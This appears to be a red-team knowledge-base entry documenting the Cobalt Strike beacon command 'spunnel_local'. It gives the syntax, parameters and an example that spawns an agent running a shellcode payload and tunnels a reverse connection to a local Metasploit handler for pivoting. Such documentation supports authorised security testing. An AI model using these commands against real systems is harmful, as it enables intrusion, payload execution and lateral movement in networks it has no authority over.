---
id: 57903137-bc6b-4517-8671-9008ab021fac
name: cobalt-strike-spunnel-local
type: command
executor: bash
data: beacon > spunnel_local $_ARCH $_LOCAL_IP $_LOCAL_PORT $_PAYLOAD_PATH
output: null
created_at: '2023-04-06T03:56:16.576509+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - pivoting
  - spunnel
verified: true
validated: true
---

# cobalt-strike-spunnel-local

## Command

```bash
beacon > spunnel_local $_ARCH $_LOCAL_IP $_LOCAL_PORT $_PAYLOAD_PATH
```

## Description

Spawns a new agent and creates a reverse port forward tunneled through the Cobalt Strike client to a local handler.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ARCH | Architecture: x64 or x86 | Yes |
| $_LOCAL_IP | Local IP (e.g., 127.0.0.1) | Yes |
| $_LOCAL_PORT | Local port for handler | Yes |
| $_PAYLOAD_PATH | Path to shellcode payload | Yes |

## Examples

### Basic Usage

```bash
beacon > spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
```

## Expected Output

"Beacon spawned with local tunnel". Connect-back handled by local MSF listener.

## Related

- [[procedures/Establish-VPN-Like-Connection-and-Pivot-Using-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
